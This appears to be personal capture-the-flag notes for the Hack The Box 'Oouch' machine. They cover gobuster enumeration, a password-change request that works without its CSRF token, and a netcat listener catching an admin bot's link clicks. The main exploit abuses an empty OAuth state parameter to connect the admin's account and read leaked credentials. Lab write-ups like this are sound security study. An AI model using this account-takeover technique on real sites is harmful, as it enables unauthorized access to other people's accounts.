@@ -1,0 +1,198 @@
+This is the Flask app: 
+NOTE: If username and password are the same the server throws a 500. 
+
+1. using the Register link to create a new account 
+soundsystem:password2
+
+2. Logged in as my user http://10.10.10.177:5000/home
+3. Checking out the profile page and there is a note saying that no accounts are connected yet. 
+- Testing to see if I can hit pages without a cookie: 
+send GET with cookie == 200
+send GET w/o cookie == 302
+send GET w/p cookie to invalid endpoint == 404
+- result I can enumerate without being logged in and just look for 302 responses. 
+- running gobuster against the site. 
+└─$ gobuster dir -u http://10.10.10.177:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+
+dir == directory scanning mode 
+-u == the target url you want to hit
+-w == the wordlist that will append values to the requests
+Results
+/contact              (Status: 302) [Size: 251] [--> http://10.10.10.177:5000/login?next=%2Fcontact]
+/about                (Status: 302) [Size: 247] [--> http://10.10.10.177:5000/login?next=%2Fabout]  
+/home                 (Status: 302) [Size: 245] [--> http://10.10.10.177:5000/login?next=%2Fhome]   
+/login                (Status: 200) [Size: 1828]                                                    
+/register             (Status: 200) [Size: 2109]                                                    
+/profile              (Status: 302) [Size: 251] [--> http://10.10.10.177:5000/login?next=%2Fprofile]
+/documents            (Status: 302) [Size: 255] [--> http://10.10.10.177:5000/login?next=%2Fdocuments]
+/logout               (Status: 302) [Size: 219] [--> http://10.10.10.177:5000/login]    
+
+4. Looking at change password
+- change the users password and inspect the request in burp
+- send the POST to repeater 
+- there is a csrf token in the request 
+- if I remove the csrf token from the request and send the password change does it work?
+-- turn intercept ON
+-- fill out password change and hit submit
+-- send the POST to repeater and remove the csrf token
+-- hit sent
+-- turn intercept OFF
+-- logged out as my user 
+-- logged back in with my users new password 
+-- Result: you can change passwords w/o the csrf token
+
+5. Looking at documents
+- states that this page is only available for admins
+
+NOTE about page is nothing interesting
+
+6. Looking at Contact page 
+- I am able to send a message to the "admin" 
+- testing to see if I can get code execution via this field
+- Sending a test of <img src="http://10.10.14.2/AlwaysBeTesting"> then setting up 
+a listener on my box results in a block 
+- Trying again with a link
+-- create a listener on 80 
+┌──(kali㉿kali)-[~/shields-up]
+└─$ nc -lvnp 80
+listening on [any] 80 ...
+-- add a url to my tun0 ip in the contact field 
+http://10.10.14.6/alwaysbetesting
+-- they clicked it! 
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 49840
+GET /alwaysbetesting HTTP/1.1
+Host: 10.10.14.6
+User-Agent: python-requests/2.21.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+- Result I can get Admin to clikc on links
+
+NOTE: going to investigate the Authorization server now
+
+7. Discover /oauth endpoint 
+In order to connect your account with our Oouch authorization server, please visit:
+http://consumer.oouch.htb:5000/oauth/connect
+
+Once your account is connected, you should be able to use the authorization server for login. Just visit:
+http://consumer.oouch.htb:5000/oauth/login
+
+NOTE: updating hosts file with consumer.oouch.htb
+
+Clicking on http://consumer.oouch.htb:5000/oauth/connect brings me to a signin page 
+- log in as soundsystem
+
+there is a redirect to authorization.oouch.htb so adding that to the hosts 
+
+http://authorization.oouch.htb:8000/ now works
+
+- Registering a new user on the auth server 
+soundsystemauth:p4ssw0rd!
+
+Logged in as: soundsystemauth
+
+You have successfully authenticated and should be able to use the authorization server :D
+
+Relevant endpoints are:
+
+    /oauth/authorize
+    /oauth/token
+
+Going to /oauth/authorize == invlaid request "missing client_id param"
+Going to /oauth/token == blank page response back is HTTP/1.1 405 Method Not Allowed on a GET
+Switch to a POST and the response is: 
+
+HTTP/1.1 400 Bad Request
+{"error": "unsupported_grant_type"}
+
+Forming the request: 
+POST /oauth/token/ HTTP/1.1
+Host: authorization.oouch.htb:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://authorization.oouch.htb:8000/home/
+Connection: close
+Cookie: csrftoken=BFC2b7lDqwoaFC55Bups9VV8Z0oC6IIT2ih84nvC0CnJ7V7EDpSnF0myVTR2T6AQ; sessionid=xqxv5do1asmi3fk2kprdbmw0ivzj2uh1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+grant_type=authorization_code&code=AlwaysBeTesting
+
+Response at this point: 
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Cache-Control: no-store
+Pragma: no-cache
+WWW-Authenticate: Bearer, error="invalid_client"
+X-Frame-Options: SAMEORIGIN
+Content-Length: 27
+Vary: Authorization
+
+{"error": "invalid_client"}
+
+Go back to the consumer /oauth endpoint and click on the http://consumer.oouch.htb:5000/oauth/connect
+with intercept on. 
+There is a GET in the workflow that includes the client id
+GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82
+
+This then takes me to a page asking Authorize Oouch-Consumer?
+
+After authorizing a POST is sent: 
+POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
+Host: authorization.oouch.htb:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 266
+Origin: http://authorization.oouch.htb:8000
+Connection: close
+Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
+Cookie: csrftoken=BFC2b7lDqwoaFC55Bups9VV8Z0oC6IIT2ih84nvC0CnJ7V7EDpSnF0myVTR2T6AQ; sessionid=xqxv5do1asmi3fk2kprdbmw0ivzj2uh1
+Upgrade-Insecure-Requests: 1
+
+csrfmiddlewaretoken=QTQay68vje3fX5AvywvgHN8bCCMs5D2A3haMMkHjL4C5JXETwY6R0Rm90KYzBYA2&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
+
+The vulnribility is in this POST because "state=" is empty
+When state is empty it allows a user to use a token for something it is not.
+
+Completing the workflow with defaults shows me that I have granted access to the soundsystemauth user
+
+EXPLOIT: 
+- start the workflow again on http://10.10.10.177:5000/oauth with intercept ON
+- after clicking the authorize button you will see this request GET /oauth/connect/token?code=d2JXWstk0jSXnN3WXu7mgK8LjQljM2 
+- because there is no state if any account hits that url then they will give us access to thier account 
+- if state was being used correctly then the state would be tied to something like a session id or username
+- because there is no state there is no user tied to the token
+
+1. Copy the token url and go to the contact form: 
+example: http://consumer.oouch.htb:5000/oauth/connect/token?code=D30sJJrbIQWRvrA7nUlfsBDyPHM3bH 
+setup a listener on 80 and resent the click me example so you know the admin clicked the url
+┌──(kali㉿kali)-[~/shields-up/CTF/HTB-oouch-oAuth/ftp]
+└─$ nc -lvnkp 80
+listening on [any] 80 ..
+
+once I see the test has been clicked I confim on the profile page that there is no longer an account associated with my user 
+    Connected-Accounts:
+    soundsystem
+    soundsystem@fake.org
+    No Accounts Connected.
+
+Logout and use the oauth url to login /oauth/login 
+Reauthorize when prompted 
+
+I now have access to the admins documents page
+
+
+
+    dev_access.txt
+    o_auth_notes.txt
+    todo.txt
+
+    develop:supermegasecureklarabubu123! -> Allows application registration.
+    /api/get_user -> user data. oauth/authorize -> Now also supports GET method.
+    Chris mentioned all users could obtain my ssh key. Must be a joke...
